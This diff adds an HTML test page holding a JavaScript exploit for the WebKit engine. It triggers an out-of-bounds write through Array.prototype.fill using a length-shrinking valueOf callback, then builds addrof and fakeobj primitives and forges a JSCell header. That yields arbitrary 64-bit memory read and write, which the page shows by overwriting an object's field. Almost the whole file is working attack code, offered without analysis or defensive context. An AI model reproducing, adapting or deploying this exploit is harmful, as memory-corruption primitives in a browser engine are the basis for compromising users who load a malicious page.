@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>WebKit OOB Test</title>
+</head>
+<body>
+<h2>WebKit OOB Exploit Test</h2>
+<pre id="log"></pre>
+
+<script>
+function print(msg) {
+    document.getElementById("log").textContent += msg + "\n";
+}
+
+const ab = new ArrayBuffer(8);
+const u32 = new Uint32Array(ab);
+const u64 = new BigUint64Array(ab);
+const f64 = new Float64Array(ab);
+
+function i2f(v) {
+    u64[0] = BigInt(v);
+    return f64[0];
+}
+
+function f2i(v) {
+    f64[0] = v;
+    return u64[0];
+}
+
+const oob_idx = 14;
+
+const float_arr = [];
+const obj_arr = [];
+
+function addrof(obj) {
+    obj_arr[0] = obj;
+    return f2i(float_arr[oob_idx]);
+}
+
+function fakeobj(val) {
+    let obj = undefined;
+    let origin = float_arr[oob_idx];
+    float_arr[oob_idx] = i2f(val);
+    obj = obj_arr[0];
+    float_arr[oob_idx] = origin;
+    return obj;
+}
+
+function trigger() {
+    const v0 = [];
+    for (let i2 = 0; i2 < 100; i2++) {
+        v0[i2] = 1.1;
+    }
+
+    function f11() {
+        v0.length = 8;
+        for (let i2 = 0; i2 < 8; i2++) {
+            float_arr[i2] = 1.2;
+            obj_arr[i2] = {};
+        }
+        return 0;
+    }
+
+    const o14 = {
+        valueOf: f11,
+    };
+
+    v0.fill(i2f(0x100), o14, 20);
+}
+
+function foo() {
+    eval("1");
+
+    trigger();
+
+    let jscell_header = i2f(0x0108240700000000n - 0x0002000000000000n);
+    let arrs = [];
+
+    for (let i = 0; i < 0x100; i++) {
+        let arr = [1.1, 2.2, 3.3, 4.4];
+        arr.x = 1.1 * i;
+        arrs.push(arr);
+    }
+
+    let rw_arr = new Array(0x20).fill(2.1);
+    rw_arr[3] = Math.random();
+    rw_arr.x = 1.1;
+
+    let container = {
+        jscell_header: jscell_header,
+        butterfly: rw_arr,
+    };
+
+    let container_addr = addrof(container);
+    let fake_header_addr = container_addr + 0x10n;
+    let fake_arr = fakeobj(fake_header_addr);
+
+    jscell_header = fake_arr[0];
+    container.jscell_header = i2f(f2i(jscell_header) - 0x0002000000000000n);
+
+    function read64(addr) {
+        fake_arr[1] = i2f(addr + 0x10n);
+        return f2i(rw_arr.x) + 0x0002000000000000n;
+    }
+
+    function write64(addr, val) {
+        fake_arr[1] = i2f(addr);
+        rw_arr[0] = i2f(val);
+    }
+
+    let test_obj = {x: 1.1};
+    let test_obj_addr = addrof(test_obj);
+
+    print("test_obj.x => 0x" + (read64(test_obj_addr + 0x10n)).toString(16));
+    write64(test_obj_addr + 0x10n, 0x41414141414141n);
+    print("test_obj.x => 0x" + (read64(test_obj_addr + 0x10n)).toString(16));
+}
+
+try {
+    foo();
+} catch(e) {
+    print("Error: " + e);
+}
+</script>
+
+</body>
+</html>
